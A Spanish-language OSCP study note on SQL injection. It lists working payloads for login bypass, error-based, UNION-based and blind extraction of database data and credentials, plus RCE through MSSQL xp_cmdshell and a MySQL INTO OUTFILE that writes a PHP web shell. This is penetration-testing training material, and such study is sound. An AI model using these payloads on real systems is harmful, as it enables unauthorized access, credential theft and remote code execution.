---
tipo: tecnica
fase: explotacion
so: [linux, windows]
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# SQL Injection

> [!abstract] Qué es y cuándo usarla
> Input del usuario que se concatena en una query SQL sin sanear → reescribimos la sentencia. Sospechar en **cualquier** campo que acabe en una query: login, buscadores, parámetros `?id=`/`?user=`, filtros. Impacto según caso: **bypass de auth**, **dump de datos/credenciales**, **RCE**.

## Requisitos previos
- Un parámetro que llegue a una query (GET o POST).
- curl/Burp para ver la request exacta y la respuesta cruda (no fiarse del navegador).

## 1. Confirmar la inyección
Meter un `'` → si sale error SQL o cambia el comportamiento, es inyectable.
Comentario de cierre: `-- ` (dos guiones + **espacio**). En estos apuntes se trailea con `//` para visibilidad y evitar truncado de whitespace: `-- //`.

## 2. Bypass de autenticación
```sql
offsec' OR 1=1 -- //
```
`OR 1=1` siempre true + `--` comenta el chequeo del password.

## 3. Error-based (dato en el mensaje de error)
Operador `IN` compara booleano con string → el error filtra el valor. **Una columna a la vez**:
```sql
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## 4. UNION-based (in-band, salida tabular)
Requisitos: mismo **nº de columnas** + **tipos compatibles**.
```sql
' ORDER BY 1-- //                                  -- subir N hasta que falle → nº de columnas
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //      -- ver qué columnas se pintan (col1=id no se muestra)
' UNION SELECT null,null,database(),user(),@@version -- //   -- enumerar en columnas que se muestran
' union select null,table_name,column_name,table_schema,null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null,username,password,description,null FROM users -- //   -- dump
```

## 5. Blind (sin salida de datos)
```
user=offsec' AND 1=1 -- //                          -- boolean: comparar con AND 1=2
user=offsec' AND IF (1=1, sleep(3),'false') -- //   -- time-based: mide el retardo
```

## Sintaxis por motor
| Acción | MySQL | MSSQL |
|---|---|---|
| Versión | `version()` / `@@version` | `@@version` |
| Usuario | `system_user()` / `user()` | `SYSTEM_USER` |
| Listar BDs | `show databases;` | `SELECT name FROM sys.databases;` |
| Notación tabla | `bd.tabla` | `bd.dbo.tabla` |
| Metadatos | `information_schema.columns` | `bd.information_schema.tables` |

## RCE
- **MSSQL**: `xp_cmdshell` (activar con `sp_configure` + `RECONFIGURE`, llamar con `EXECUTE`).
- **MySQL**: `SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/shell.php"` (ruta escribible).

> [!warning] Detección / problemas
> - Usa **curl/Burp**, no el navegador (reformatea la salida).
> - `--` necesita el espacio final; por eso `-- //`.
> - En UNION, la columna 1 suele ser `id` (int) → no muestra strings; desplaza las funciones a la derecha.
> - En blind, establece una línea base TRUE/FALSE con un valor válido y uno inexistente.

## Visto en
- Módulo: [[10 - SQL Injection Attacks]]
- Cheatsheet: [[Web]]
- Relacionado: [[SQLMap]]
- Máquinas: [[]]
